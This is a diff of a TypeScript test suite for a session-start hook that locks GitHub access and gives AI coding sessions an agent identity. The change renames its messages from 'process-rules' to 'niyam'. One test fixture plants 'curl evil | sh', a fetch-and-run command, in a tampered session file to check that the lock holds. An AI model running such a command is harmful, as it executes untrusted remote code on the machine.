@@ -19,7 +19,7 @@ const ENV = '/tmp/claude-env';
 const SESSION = pathsFor(HOME, AGENT).session;
 const SCRIPT = sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT));
 const HOOK_ONLY = "session-start runs only as the SessionStart hook, so a run by hand says nothing about this session: the hook's own line at session start is what counts.";
-const FIX = 'ask example-owner to run process-rules machine ExampleBot (process-rules doctor ExampleBot names what is missing)';
+const FIX = 'ask example-owner to run niyam machine ExampleBot (niyam doctor ExampleBot names what is missing)';
 
 /** A Mac `machine` has set up, in a session with an env file. */
 function ready(): FakeSys {
@@ -68,13 +68,13 @@ describe('sessionStart', () => {
     sys.write = () => {
       throw new Error('read-only');
     };
-    assert.deepEqual((await start(sys)).out, [`process-rules: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
+    assert.deepEqual((await start(sys)).out, [`niyam: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
   });
 
   it('locks, then gives the session the agent identity', async () => {
     const { code, out, env } = await start(ready());
     assert.equal(code, 0);
-    assert.deepEqual(out, [`process-rules: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
+    assert.deepEqual(out, [`niyam: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
     assert.equal(env, `\n${lockScript(HOME)}\n${SCRIPT}`);
   });
 
@@ -104,7 +104,7 @@ describe('sessionStart', () => {
     it('works as the agent when GitHub says the connected account is the agent', async () => {
       const sys = cloud(AGENT);
       const { out, env } = await start(sys);
-      assert.deepEqual(out, ['process-rules: this cloud session works as ExampleBot on GitHub.']);
+      assert.deepEqual(out, ['niyam: this cloud session works as ExampleBot on GitHub.']);
       assert.equal(env, `\nunset ${Object.keys(BASE_ENV).join(' ')}\nexport GH_TOKEN=proxy-injected GITHUB_TOKEN=proxy-injected PROCESS_RULES_AGENT=ExampleBot\n`);
       assert.equal(sys.files.get(RECORD), '{"agent":"ExampleBot"}\n');
       assert.equal(sys.requests.at(-1)?.token, PROXY_TOKEN, 'the proxy placeholder, never the lock');
@@ -122,15 +122,15 @@ describe('sessionStart', () => {
       assert.equal(older.files.get(hook), PRE_PUSH_HOOK);
     });
 
-    it("leaves the client's own pre-push hook, saying when it does not run process-rules", async () => {
+    it("leaves the client's own pre-push hook, saying when it does not run niyam", async () => {
       const hook = `${ROOT}/.git/hooks/pre-push`;
       const ours = cloud(AGENT);
       ours.files.set(hook, '#!/bin/sh\npnpm lint\nprocess-rules pre-push "$@"\n');
-      assert.deepEqual((await start(ours)).out, ['process-rules: this cloud session works as ExampleBot on GitHub.']);
+      assert.deepEqual((await start(ours)).out, ['niyam: this cloud session works as ExampleBot on GitHub.']);
       const own = cloud(AGENT);
       own.files.set(hook, '#!/bin/sh\npnpm lint\n');
       assert.deepEqual((await start(own)).out, [
-        "process-rules: this cloud session works as ExampleBot on GitHub. Its pre-push hook .git/hooks/pre-push does not run process-rules, so only the pull request's checks hold the work rules.",
+        "niyam: this cloud session works as ExampleBot on GitHub. Its pre-push hook .git/hooks/pre-push does not run niyam, so only the pull request's checks hold the work rules.",
       ]);
       assert.equal(own.files.get(hook), '#!/bin/sh\npnpm lint\n');
     });
@@ -139,7 +139,7 @@ describe('sessionStart', () => {
       const sys = cloud(AGENT);
       sys.execOverride = (call) => (call.args[1] === '--git-path' ? { code: 0, stdout: '/shared/hooks/pre-push\n', stderr: '' } : undefined);
       assert.deepEqual((await start(sys)).out, [
-        "process-rules: this cloud session works as ExampleBot on GitHub. Its pre-push hook /shared/hooks/pre-push is outside the repository and was not checked, so only the pull request's checks may hold the work rules.",
+        "niyam: this cloud session works as ExampleBot on GitHub. Its pre-push hook /shared/hooks/pre-push is outside the repository and was not checked, so only the pull request's checks may hold the work rules.",
       ]);
       assert.equal(sys.files.has('/shared/hooks/pre-push'), false);
     });
@@ -150,13 +150,13 @@ describe('sessionStart', () => {
         throw new Error('read-only');
       };
       assert.deepEqual((await start(sys)).out, [
-        `process-rules: STOP. Writing the pre-push git hook failed (read-only), so this cloud session's pushes cannot be checked. ${STOP}`,
+        `niyam: STOP. Writing the pre-push git hook failed (read-only), so this cloud session's pushes cannot be checked. ${STOP}`,
       ]);
       assert.equal(sys.files.get(ENV), undefined, 'the lock stays');
     });
 
     describe("when the installed CLI is not the release the repo pins", () => {
-      const WORKS = 'process-rules: this cloud session works as ExampleBot on GitHub.';
+      const WORKS = 'niyam: this cloud session works as ExampleBot on GitHub.';
       const CLOUD_FILE = `${ROOT}/${CLOUD_SETUP_PATH}`;
       const v = packageVersion();
       /** A cloud session in a repo whose workflow pins `pin` and whose cloud setup file, when given, installs `file`. */
@@ -184,7 +184,7 @@ describe('sessionStart', () => {
         const { out } = await start(sys);
         assert.deepEqual(out, [
           WORKS,
-          `process-rules: this cloud session's environment held process-rules ${v}; installed 0.0.1 from ${CLOUD_SETUP_PATH}, as the repo pins, for this session. The environment catches up when Claude builds it again.`,
+          `niyam: this cloud session's environment held niyam ${v}; installed 0.0.1 from ${CLOUD_SETUP_PATH}, as the repo pins, for this session. The environment catches up when Claude builds it again.`,
         ]);
         assert.deepEqual(installs(sys).map((call) => [call.args, call.timeoutMs]), [[[CLOUD_FILE], CLOUD_INSTALL_MS]]);
         assert.equal(sys.files.get(RECORD), '{"agent":"ExampleBot"}\n', 'it never blocks');
@@ -193,7 +193,7 @@ describe('sessionStart', () => {
       it('names the one paste when the Setup script installs a release of its own', async () => {
         const sys = repoAt('0.0.1', '0.0.1');
         assert.deepEqual((await start(sys)).out.slice(1), [
-          `process-rules: this cloud session's environment held process-rules ${v}; installed 0.0.1 from ${CLOUD_SETUP_PATH}, as the repo pins, for this session. The environment catches up when Claude builds it again. The cloud environment's Setup script installs a release of its own: paste what process-rules cloud-setup prints over its process-rules part, once, and new releases then need no paste.`,
+          `niyam: this cloud session's environment held niyam ${v}; installed 0.0.1 from ${CLOUD_SETUP_PATH}, as the repo pins, for this session. The environment catches up when Claude builds it again. The cloud environment's Setup script installs a release of its own: paste what niyam cloud-setup prints over its process-rules part, once, and new releases then need no paste.`,
         ]);
       });
 
@@ -202,7 +202,7 @@ describe('sessionStart', () => {
         sys.files.set(FROM_SETUP, '');
         sys.execOverride = (call) => (call.command === 'bash' ? { code: 22, stdout: '', stderr: 'downloading\ncurl: (22) The requested URL returned error: 404\n' } : undefined);
         assert.deepEqual((await start(sys)).out.slice(1), [
-          `process-rules: this cloud session runs process-rules ${v}, but ${CLOUD_SETUP_PATH} installs 0.0.1, and running it failed (curl: (22) The requested URL returned error: 404); the session works on with ${v}.`,
+          `niyam: this cloud session runs niyam ${v}, but ${CLOUD_SETUP_PATH} installs 0.0.1, and running it failed (curl: (22) The requested URL returned error: 404); the session works on with ${v}.`,
         ]);
         const silent = repoAt('0.0.1', '0.0.1');
         silent.files.set(FROM_SETUP, '');
@@ -213,11 +213,11 @@ describe('sessionStart', () => {
       it('says to run onboard again, not to paste, when the cloud setup file is missing or not at the pin', async () => {
         const missing = repoAt('0.0.1');
         assert.deepEqual((await start(missing)).out.slice(1), [
-          `process-rules: this cloud session runs process-rules ${v}, but .github/workflows/process-rules.yml pins v0.0.1, and the repo has no ${CLOUD_SETUP_PATH} to install it from. Run process-rules onboard again, which writes it; then paste what process-rules cloud-setup prints over the process-rules part of the cloud environment's Setup script, once.`,
+          `niyam: this cloud session runs niyam ${v}, but .github/workflows/process-rules.yml pins v0.0.1, and the repo has no ${CLOUD_SETUP_PATH} to install it from. Run niyam onboard again, which writes it; then paste what niyam cloud-setup prints over the process-rules part of the cloud environment's Setup script, once.`,
         ]);
         const behind = repoAt('0.0.2', '0.0.1');
         assert.deepEqual((await start(behind)).out.slice(1), [
-          `process-rules: ${CLOUD_SETUP_PATH} installs process-rules 0.0.1, but .github/workflows/process-rules.yml pins v0.0.2. Run process-rules onboard again, which writes the file at the pin.`,
+          `niyam: ${CLOUD_SETUP_PATH} installs niyam 0.0.1, but .github/workflows/process-rules.yml pins v0.0.2. Run niyam onboard again, which writes the file at the pin.`,
         ]);
         assert.deepEqual([...installs(missing), ...installs(behind)], [], 'nothing installed from a file that is not at the pin');
         const stopped = repoAt('0.0.1', undefined, OWNER_LOGIN);
@@ -268,7 +268,7 @@ describe('sessionStart', () => {
       const sys = cloud(OWNER_LOGIN);
       const { out, env } = await start(sys);
       assert.deepEqual(out, [
-        `process-rules: STOP. This cloud session reaches GitHub as example-owner, not ExampleBot: claude.ai's GitHub connection must be ExampleBot for agent sessions. ${STOP}`,
+        `niyam: STOP. This cloud session reaches GitHub as example-owner, not ExampleBot: claude.ai's GitHub connection must be ExampleBot for agent sessions. ${STOP}`,
       ]);
       assert.equal(env, undefined);
       assert.deepEqual(JSON.parse(sys.files.get(RECORD) ?? ''), { problem: out[0] });
@@ -276,7 +276,7 @@ describe('sessionStart', () => {
 
     it('says to stop when GitHub cannot be asked', async () => {
       assert.deepEqual((await start(cloud(null))).out, [
-        `process-rules: STOP. GitHub answered HTTP 401 when asked who this session is, so it cannot be checked as ExampleBot. ${STOP}`,
+        `niyam: STOP. GitHub answered HTTP 401 when asked who this session is, so it cannot be checked as ExampleBot. ${STOP}`,
       ]);
       const sys = cloud(null);
       sys.http = () => Promise.reject(new Error('proxy down'));
@@ -289,16 +289,16 @@ describe('sessionStart', () => {
     it('says to stop without settings, an env file, or when the env file cannot be written', async () => {
       const bare = cloud(AGENT);
       bare.files.delete(`${ROOT}/.github/process-rules.json`);
-      assert.match((await start(bare)).out[0] ?? '', /^process-rules: STOP\. .*, so this cloud session cannot be checked as the agent\. .*tell the owner\.$/);
+      assert.match((await start(bare)).out[0] ?? '', /^niyam: STOP\. .*, so this cloud session cannot be checked as the agent\. .*tell the owner\.$/);
       const noFile = cloud(AGENT);
       delete noFile.env.CLAUDE_ENV_FILE;
-      assert.deepEqual((await start(noFile)).out, [`process-rules: STOP. CLAUDE_ENV_FILE is unset, so this cloud session cannot be given the agent identity. ${STOP} ${HOOK_ONLY}`]);
+      assert.deepEqual((await start(noFile)).out, [`niyam: STOP. CLAUDE_ENV_FILE is unset, so this cloud session cannot be given the agent identity. ${STOP} ${HOOK_ONLY}`]);
       const readOnly = cloud(AGENT);
       readOnly.append = () => {
         throw new Error('read-only');
       };
       assert.deepEqual((await start(readOnly)).out, [
-        `process-rules: STOP. Writing to CLAUDE_ENV_FILE failed (read-only), so this cloud session cannot be given the agent identity. ${STOP}`,
+        `niyam: STOP. Writing to CLAUDE_ENV_FILE failed (read-only), so this cloud session cannot be given the agent identity. ${STOP}`,
       ]);
     });
   });
@@ -310,7 +310,7 @@ describe('sessionStart', () => {
     assert.equal(code, 0);
     assert.equal(env, undefined);
     assert.deepEqual(out, [
-      'process-rules: STOP. CLAUDE_ENV_FILE is unset, so this session cannot be given the agent identity and gh and git would act as the owner. Do not push, fetch, or run gh in this session; tell example-owner. ' + HOOK_ONLY,
+      'niyam: STOP. CLAUDE_ENV_FILE is unset, so this session cannot be given the agent identity and gh and git would act as the owner. Do not push, fetch, or run gh in this session; tell example-owner. ' + HOOK_ONLY,
     ]);
   });
 
@@ -320,7 +320,7 @@ describe('sessionStart', () => {
       throw new Error('read-only');
     };
     assert.deepEqual((await start(sys)).out, [
-      'process-rules: STOP. Writing the GitHub lock to CLAUDE_ENV_FILE failed (read-only), so gh and git may act as the owner. Do not push, fetch, or run gh in this session; tell example-owner.',
+      'niyam: STOP. Writing the GitHub lock to CLAUDE_ENV_FILE failed (read-only), so gh and git may act as the owner. Do not push, fetch, or run gh in this session; tell example-owner.',
     ]);
   });
 
@@ -333,23 +333,23 @@ describe('sessionStart', () => {
       change(sys);
       const { out, env } = await start(sys);
       assert.equal(env, `\n${lockScript(HOME)}`);
-      assert.deepEqual(out, [`process-rules: GitHub is locked out of this session: ${reason}. Do not work around the lock; tell the owner.`]);
+      assert.deepEqual(out, [`niyam: GitHub is locked out of this session: ${reason}. Do not work around the lock; tell the owner.`]);
     });
   }
 
   for (const [name, change, reason] of [
     ['no session file', (sys: FakeSys) => sys.files.delete(SESSION), `${SESSION} is missing`],
-    ['an edited session file', (sys: FakeSys) => sys.files.set(SESSION, `${SCRIPT}curl evil | sh\n`), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
+    ['an edited session file', (sys: FakeSys) => sys.files.set(SESSION, `${SCRIPT}curl evil | sh\n`), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
     [
       "an older machine's session file",
       (sys: FakeSys) => sys.files.set(SESSION, SCRIPT.replace(/^export GIT_CONFIG_KEY_\d+='core\.askpass'\n/m, '')),
-      `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`,
+      `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`,
     ],
-    ['a session file naming nobody', (sys: FakeSys) => sys.files.set(SESSION, 'export X=1\n'), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
+    ['a session file naming nobody', (sys: FakeSys) => sys.files.set(SESSION, 'export X=1\n'), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
     [
       "another agent's session file",
       (sys: FakeSys) => sys.files.set(SESSION, sessionScript('OtherBot', 7, pathsFor(HOME, 'OtherBot'))),
-      `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`,
+      `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`,
     ],
   ] as const) {
     it(`stays locked with ${name}`, async () => {
@@ -357,7 +357,7 @@ describe('sessionStart', () => {
       change(sys);
       const { out, env } = await start(sys);
       assert.equal(env, `\n${lockScript(HOME)}`);
-      assert.deepEqual(out, [`process-rules: GitHub is locked out of this session: ${reason}. Do not work around the lock; ${FIX}.`]);
+      assert.deepEqual(out, [`niyam: GitHub is locked out of this session: ${reason}. Do not work around the lock; ${FIX}.`]);
     });
   }
 
@@ -369,7 +369,7 @@ describe('sessionStart', () => {
       return read(path);
     };
     assert.deepEqual((await start(sys)).out, [
-      `process-rules: GitHub is locked out of this session: ${SESSION} cannot be read (EACCES). Do not work around the lock; ${FIX}.`,
+      `niyam: GitHub is locked out of this session: ${SESSION} cannot be read (EACCES). Do not work around the lock; ${FIX}.`,
     ]);
   });
 
@@ -384,14 +384,14 @@ describe('sessionStart', () => {
     const { out, env } = await start(sys);
     assert.equal(env, `\n${lockScript(HOME)}`);
     assert.deepEqual(out, [
-      `process-rules: GitHub is locked out of this session: appending ${SESSION} to CLAUDE_ENV_FILE failed (disk full). Do not work around the lock; ${FIX}.`,
+      `niyam: GitHub is locked out of this session: appending ${SESSION} to CLAUDE_ENV_FILE failed (disk full). Do not work around the lock; ${FIX}.`,
     ]);
   });
 
   it('accepts settings naming the agent in another case', async () => {
     const sys = ready();
     sys.files.set(`${ROOT}/.github/process-rules.json`, JSON.stringify({ owner: 'example-owner', agent: 'examplebot' }));
-    assert.deepEqual((await start(sys)).out, [`process-rules: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
+    assert.deepEqual((await start(sys)).out, [`niyam: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
   });
 
   describe('with two owners and two agents', () => {
@@ -403,11 +403,11 @@ describe('sessionStart', () => {
       return sys;
     };
     const locked = (reason: string): string =>
-      `process-rules: GitHub is locked out of this session: ${reason}. Do not work around the lock; ask example-owner to run process-rules machine <agent> for one of them.`;
+      `niyam: GitHub is locked out of this session: ${reason}. Do not work around the lock; ask example-owner to run niyam machine <agent> for one of them.`;
 
     it('works as the one agent machine set up on this Mac', async () => {
       const { out, env } = await start(team());
-      assert.deepEqual(out, [`process-rules: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
+      assert.deepEqual(out, [`niyam: this session works as ExampleBot on GitHub. ${AUTO_FIX}`]);
       assert.equal(env, `\n${lockScript(HOME)}\n${SCRIPT}`);
     });
 
@@ -416,7 +416,7 @@ describe('sessionStart', () => {
       sys.files.delete(SESSION);
       const { out, env } = await start(sys);
       assert.equal(env, `\n${lockScript(HOME)}`);
-      assert.deepEqual(out, [locked('.github/process-rules.json names the agents OtherBot or ExampleBot, and process-rules machine has set up none of them on this machine')]);
+      assert.deepEqual(out, [locked('.github/process-rules.json names the agents OtherBot or ExampleBot, and niyam machine has set up none of them on this machine')]);
     });
 
     it('stays locked rather than guess when machine set up both', async () => {
@@ -426,7 +426,7 @@ describe('sessionStart', () => {
       assert.equal(env, `\n${lockScript(HOME)}`);
       assert.deepEqual(out, [
         locked(
-          '.github/process-rules.json names the agents OtherBot or ExampleBot, and process-rules machine has set up OtherBot and ExampleBot on this machine, so which one this session works as cannot be told; remove the others\' folders under ~/.config/process-rules',
+          '.github/process-rules.json names the agents OtherBot or ExampleBot, and niyam machine has set up OtherBot and ExampleBot on this machine, so which one this session works as cannot be told; remove the others\' folders under ~/.config/process-rules',
         ),
       ]);
     });
@@ -439,10 +439,10 @@ describe('sessionStart', () => {
         sys.acceptToken(PROXY_TOKEN, login);
         return sys;
       };
-      assert.deepEqual((await start(cloud('OtherBot'))).out, ['process-rules: this cloud session works as OtherBot on GitHub.']);
-      assert.deepEqual((await start(cloud(AGENT))).out, ['process-rules: this cloud session works as ExampleBot on GitHub.']);
+      assert.deepEqual((await start(cloud('OtherBot'))).out, ['niyam: this cloud session works as OtherBot on GitHub.']);
+      assert.deepEqual((await start(cloud(AGENT))).out, ['niyam: this cloud session works as ExampleBot on GitHub.']);
       assert.deepEqual((await start(cloud('Second-Owner'))).out, [
-        "process-rules: STOP. This cloud session reaches GitHub as Second-Owner, not OtherBot or ExampleBot: claude.ai's GitHub connection must be OtherBot or ExampleBot for agent sessions. Do not push, fetch, or run gh in this session; tell example-owner.",
+        "niyam: STOP. This cloud session reaches GitHub as Second-Owner, not OtherBot or ExampleBot: claude.ai's GitHub connection must be OtherBot or ExampleBot for agent sessions. Do not push, fetch, or run gh in this session; tell example-owner.",
       ]);
     });
   });
@@ -452,7 +452,7 @@ describe('sessionStart', () => {
     const { out, env } = await start(sys);
     assert.equal(env, `\n${lockScript(HOME)}`);
     assert.deepEqual(out, [
-      "process-rules: GitHub is locked out of this session: process-rules supports macOS only, where the keychain holds the agent's token; this machine runs linux. Do not work around the lock; tell example-owner.",
+      "niyam: GitHub is locked out of this session: niyam supports macOS only, where the keychain holds the agent's token; this machine runs linux. Do not work around the lock; tell example-owner.",
     ]);
   });
 
@@ -462,7 +462,7 @@ describe('sessionStart', () => {
     const { out, env } = await start(sys);
     assert.equal(env, `\n${lockScript(HOME)}\n${SCRIPT}`);
     assert.deepEqual(out, [
-      `process-rules: GitHub is locked out of this session: this Mac's keychain has no ExampleBot token, so GitHub refuses gh and git. Do not work around the lock; ${FIX}.`,
+      `niyam: GitHub is locked out of this session: this Mac's keychain has no ExampleBot token, so GitHub refuses gh and git. Do not work around the lock; ${FIX}.`,
     ]);
   });
 });
